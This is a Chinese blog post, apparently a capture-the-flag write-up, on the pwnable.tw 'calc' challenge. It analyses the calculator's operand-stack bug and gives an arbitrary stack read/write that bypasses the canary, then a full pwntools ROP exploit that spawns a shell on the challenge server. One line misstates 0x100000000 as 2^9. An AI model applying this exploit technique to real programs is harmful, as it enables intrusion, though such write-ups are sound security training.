---
title: pwnable.tw之calc
date: 2017-10-01 18:19:50
tags:
- pwnable.tw
- pwn
- rop
---

本题考查的是对程序逻辑的理解，达到任意地址读写的目的，并最终利用ROP技术执行`execve('/bin/sh')`。
<!-- more -->

# 题目分析

做过了前面`pwnable.tw`两道题后，第三题calc的难度突然增大。
`checksec`检查下开启了`canary`和`NX`。
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)

```

通过IDA pro分析，并没有发现栈溢出和堆溢出的逻辑，倒是发现了程序在`parse_expr`函数中，通过`malloc`得到的堆内存没有`free`掉。

那好只能捋一遍逻辑了。
`main`函数没什么可分析的，直接进入`calc`函数。

```
int calc()
{
  int v1; // [sp+18h] [bp-5A0h]@4
  int v2[100]; // [sp+1Ch] [bp-59Ch]@5
  char s; // [sp+1ACh] [bp-40Ch]@2
  int v4; // [sp+5ACh] [bp-Ch]@1

  v4 = *MK_FP(__GS__, 20);
  while ( 1 )
  {
    bzero(&s, 0x400u);
    if ( !get_expr((int)&s, 1024) )
      break;
    init_pool(&v1);
    if ( parse_expr((int)&s, &v1) )
    {
      printf((const char *)&unk_80BF804, v2[v1 - 1]);
      fflush((int)stdout);
    }
  }
  return *MK_FP(__GS__, 20) ^ v4;
}
```
`calc`函数主要逻辑最外层是无线循环，变量`s`是0x400大小的数组，并每次循环清空为零；
`get_expr((int)&s, 1024)`的作用是将用户输入的计算公式包括(0-9、+、-、\*、 /、 %) 存入变量`s`中。可知变量`s`代表`char[0x400]`。
`init_pool(&v1);`的作用是将变量`v1`的101个`_DWORD`大小的元素清空置零。而从变量声明来看，`v1`表示`int[101]`,可以看作`v2`是`v1`的第二个元素。

`parse_expr((int)&s, &v1)`用来处理字符串`s`，并计算结果保存在`v1`；
`printf((const char *)&unk_80BF804, v2[v1 - 1]);` 打印计算结果，计算结果存放在`v2`中，也可以认为存放在`v1`中。
```
_DWORD *__cdecl init_pool(_DWORD *a1)
{
  _DWORD *result; // eax@1
  signed int i; // [sp+Ch] [bp-4h]@1

  result = a1;
  *a1 = 0;
  for ( i = 0; i <= 99; ++i )
  {
    result = a1;
    a1[i + 1] = 0;
  }
  return result;
}
```

## parse_expr分析

`parse_expr((int)&s, &v1)`的作用是本程序的重要逻辑，负责计算公式。计算公式结果无非就是处理操作数和操作符，利用两个栈来处理，同时注意操作符的优先级。按照这个思路来分析本体会很清晰。
分析此函数，形参`a1`是用户输入公式的过滤字符串，包含（0-9，+，-，\*，/，%）。`a2`存储中间的计算结果。

程序逐一遍历字符串`a1`，直到碰到非数字字符，这里`(unsigned int)(*(_BYTE *)(i + a1) - 48) > 9`的意思是`a1[i]-'0'的绝对值大于9`，`unsigned int`将负数转换成大整数。


```
In [52]: chr(42)
Out[52]: '*'
In [53]: chr(43)
Out[53]: '+'
In [55]: chr(45)
Out[55]: '-'
In [57]: chr(47)
Out[57]: '/'
In [58]: chr(37)
Out[58]: '%'

```

接下来将之前连续的数字字符保存在`s1`中，`!strcmp(s1, "0")`判断防止除零，但是有bug，但是不是我们想要的。
在转换字符串`s1`为整数`v10`后, `v4 = (*a2)++;` `a2[v4 + 1] = v10;`这两句很关键，变量`a2`的第一个元素存储操作数的个数，`a2`之后当作存储操作数的栈。 具体的写到了下面代码中。到此还没有发现问题，只能继续分析`eval(a2, s[v8]);`。

```
signed int __cdecl parse_expr(int a1, _DWORD *a2)
{
  int v2; // ST2C_4@3
  signed int result; // eax@4
  int v4; // eax@6
  int v5; // ebx@25
  int v6; // [sp+20h] [bp-88h]@1
  int i; // [sp+24h] [bp-84h]@1
  int v8; // [sp+28h] [bp-80h]@1
  char *s1; // [sp+30h] [bp-78h]@3
  int v10; // [sp+34h] [bp-74h]@5
  char s[100]; // [sp+38h] [bp-70h]@1
  int v12; // [sp+9Ch] [bp-Ch]@1

  v12 = *MK_FP(__GS__, 20);
  v6 = a1;
  v8 = 0;
  bzero(s, 0x64u);
  for ( i = 0; ; ++i )
  {
  	// a1[i]-'0'的绝对值大于9
    if ( (unsigned int)(*(_BYTE *)(i + a1) - 48) > 9 ) 
    {
      v2 = i + a1 - v6;
      s1 = (char *)malloc(v2 + 1);
      memcpy(s1, v6, v2);
      s1[v2] = 0;
      if ( !strcmp(s1, "0") )
      {
        puts("prevent division by zero");
        fflush((int)stdout);
        result = 0;
        goto LABEL_25;
      }
      v10 = atoi(s1);
      if ( v10 > 0 )
      {
      	// 变量`a2`的第一个元素存储操作数的个数，`a2`之后当作存储操作数的栈。
        v4 = (*a2)++;
        a2[v4 + 1] = v10;
      }
      // 判断字符串中符号后面是否还是符号
      if ( *(_BYTE *)(i + a1) && (unsigned int)(*(_BYTE *)(i + 1 + a1) - 48) > 9 )
      {
        puts("expression error!");
        fflush((int)stdout);
        result = 0;
        goto LABEL_25;
      }
      // 记录上次数字开始位置
      v6 = i + 1 + a1;
      // s[v8] 是操作符栈, 如果是第一次，赋值当前操作符；否则去处理。
      if ( s[v8] )
      {
      	// 判断操作符
        switch ( *(_BYTE *)(i + a1) )
        {
          case 43: // +
          case 45: // -
            eval(a2, s[v8]);
            s[v8] = *(_BYTE *)(i + a1);
            break;
          case 37: // %
          case 42: // *
          case 47: // /
            // %,*,%优先级高，优先计算，类似9*9/3
            if ( s[v8] != 43 && s[v8] != 45 )
            {
              eval(a2, s[v8]);
              s[v8] = *(_BYTE *)(i + a1);
            }
            else // 类似9+9*3
            {
              s[++v8] = *(_BYTE *)(i + a1);
            }
            break;
          default:
            eval(a2, s[v8--]);
            break;
        }
      }
      else
      {
        s[v8] = *(_BYTE *)(i + a1);
      }
      if ( !*(_BYTE *)(i + a1) )
        break;
    }
  }
  while ( v8 >= 0 )
    eval(a2, s[v8--]);
  result = 1;
LABEL_25:
  v5 = *MK_FP(__GS__, 20) ^ v12;
  return result;
}
```

在`eval`中，形参`a2`是操作符，形参`a1`有两个责任，`a1[0]`记录着操作数栈上的个数，`a1[1:]`是操作数栈。
比如：`10+20-50`,在处理`-`时，进入`eval`函数,进行的处理为：
```
 初始： a1[0]=2, a1[1]=10, a1[2]=20, a2='+'，
 这时的做法是`a1[a1[0] -1] += a1[ a1[0] ]`,即a1[1]+=a[12],a1[1] = 30
 --a1[0] ；
 结束： a1[0] = 1；a1[1] = 30
```

所以，操作数栈最终的元素只剩下一个，`a1[0] = 1`。
```
_DWORD *__cdecl eval(_DWORD *a1, char a2)
{
  _DWORD *result; // eax@12

  if ( a2 == 43 )
  {
    a1[*a1 - 1] += a1[*a1];
  }
  else if ( a2 > 43 )
  {
    if ( a2 == 45 )
    {
      a1[*a1 - 1] -= a1[*a1];
    }
    else if ( a2 == 47 )
    {
      a1[*a1 - 1] /= a1[*a1];
    }
  }
  else if ( a2 == 42 )
  {
    a1[*a1 - 1] *= a1[*a1];
  }
  result = a1;
  --*a1;
  return result;
}
```

最后的最后，`main`函数输出`printf((const char *)&unk_80BF804, v2[v1 - 1]);`，这里相当于取值`a1[a1[0] -1+1]=a1[a1[0]]`。
分析到这里，老铁，好像没毛病。
## 逆向思考

本着任意地址读写的目的，如果我们能够控制`a1[0]`,那么我们就可以读取栈上从a1开始的任意数据了。
怎么控制`a1[0]`呢，只能逆向推过去，分析`eval`，`a1[*a1 - 1] += a1[*a1];`，哈哈，控制`a1[0]`就是让`a1[0] = 1`；
因为只有这样，`a1[ a1[0] -1 ] += a1[ a1[0] ] `才成立； `a1[0] = a1[0] + a1[1] = 1+a1[1]`。注意，“-，/，%”不好使，`*`也可以，因为相当于`a1[0] = a1[0] * a1[1] = 1*a1[1]`，也可以用，不过最后`a1[0]-1`。
继续逆向分析，怎么让`a1[0]`为1？由于`a1`是操作数栈，让操作数为1个即可，只能让左操作数为空了。
尝试`+10`，这可以泄露出`a1[10]`的值，不过好像没什么卵用。
```
➜  calc ./calc
=== Welcome to SECPROG calculator ===
+10
0

```

为什么会是0，哪里设置过了吗？查看`calc`，还真是。
```
	···
	bzero(&s, 0x400u);
    ···
    init_pool(&v1);
    ···
```

`a1（即v1）`距离`ebp`偏移量为0x5a0，转换成数组下标为0x5a0/4=360。
这次重新尝试，泄露`ebp`中的内容
```
➜  calc ./calc
=== Welcome to SECPROG calculator ===
+360
-5665800

```

老铁，成功了一半，我们只是能够读任意地址了，如何写呢？
很简单，`a1[*a1 - 1] += a1[*a1];`由于经过`+360`我们已经控制了`a1[0]`,那么之后无论再进行如何操作，都是对`a1[a1[0]]`的操作。
比如：由于每轮计算清空`v1`和`s`，所以不一样，没关系，已经证明可以更改。
```
➜  calc ./calc
=== Welcome to SECPROG calculator ===
+20
0
+20+10 
10
+20+40
40

```

到这，栈上任意地址可读可写。该题的漏洞允许攻击者绕过canary直接篡改返回值，因此canary的值不变。
由于程序开启了NX保护，无法在栈上执行shellcode。而且程序是静态编译的。考虑的使用ROP技术来调用`execve("/bin/sh")`来启动 shell，再通过cat命令查看flag的内容。
```
➜  calc objdump -R calc

calc:     file format elf32-i386

objdump: calc: not a dynamic object
objdump: calc: Invalid operation
```

我是第一次使用ROP，感觉太好用了，教程参考这里<http://vancir.com/posts/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B>。

通过ROPgadget来查找小部件，类似于`pop eax; ret`或`mov eax, esp; ret`这样的代码碎片。具体的不再赘述。
难点在于`/bin/sh\0`的地址；由于其存放在栈上，栈地址变化需要泄露出来。如何泄露栈地址？
我们能泄露保存在栈上的栈地址就是`ebp`，在`a1[360]`位置处存放的值是`main`函数的ebp。那么我们只要确定main函数的栈空间大小即可。
```
.text:08049452                 push    ebp
.text:08049453                 mov     ebp, esp
.text:08049455                 and     esp, 0FFFFFFF0h
.text:08049458                 sub     esp, 10h
```
main函数的栈空间大小计算方法是 `($ebp & 0xFFFFFFF0 -0x10)`。
我们布置好ROP代码是从`a1[361]`开始，这里是`calc`函数返回地址，`/bin/sh\0`距离`calc`的返回地址是已知的，而`calc`返回地址在main函数栈指针esp低4字节位置。所以根据相对位置推出绝对位置。

坑啊，ebp应该是无符号数，但是被当作有符号数输出，输出的是负数，需要加上0x100000000（2^9）才是无符号数的真实值。我被这个折腾了好久。

python转换int32位无符号和有符号。
```
import ctypes

def int32_to_uint32(i):
    return ctypes.c_uint32(i).value
```

# 代码

有时候运行一次会中断，再运行一次即可。

```
  from pwn import *
  
  debug=False
  if debug:
      p = process("./calc")
      #context.log_level="debug"
      #gdb.attach(p, "b*0x08049499")
  else:
      p = remote("chall.pwnable.tw","10100")
  
  p.recvuntil("=== Welcome to SECPROG calculator ===\n")
  '''
  leak main function's ebp
  '''
  payload="+360"
  p.sendline(payload)
  m_ebp =int(p.recv())
  log.success("main function's ebp is %#x"%m_ebp)
  
  esp_offset = (m_ebp+0x100000000)-((m_ebp+0x100000000) &0xFFFFFFF0-0x10)
  m_esp = m_ebp - esp_offset
  '''
  /bin/sh stores at offset 368
  '''
  bin_str_addr = m_ebp - (esp_offset-6*4)
  log.success("bin/sh is at %#x"%bin_str_addr )
  # 0x0805c34b : pop eax ; ret
  # 0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
  # 0x08049a21 : int 0x80
  rop_vars = [0x0805c34b, 0x0b, 0x080701d0, 0, 0, bin_str_addr, 0x08049a21, u32('/bin'), u32('/sh\0')]
  
  for i in range(361, 370):
      # get content
      p.sendline('+'+str(i))
      c = int(p.recv())
      if c < 0:
          c += 0x100000000
  
      log.success("# before modification at %#x is %#x"%(m_esp+ 4*(i-362), c))
      log.success("+++var is %#x"%rop_vars[i-361])
      diff =  rop_vars[i-361] -c
      if diff < 0:
          log.success('+'+str(i)+str(diff))
          p.sendline('+'+str(i)+str(diff))
      else:
          log.success('+'+str(i)+'+'+str(diff))
          p.sendline('+'+str(i)+'+'+str(diff))
      content = int(p.recv())
      log.success("# After modification at %#x is %#x"%(m_esp+ 4*(i-362), content))
  
  p.sendline("pwn")
  p.interactive()
  p.close()
             
```

# 参考
[1] [Pwnable.tw刷题之calc](http://www.freebuf.com/articles/others-articles/132283.html)
[2] [Pwnable.tw calc](http://www.jianshu.com/p/d59a41d85af1)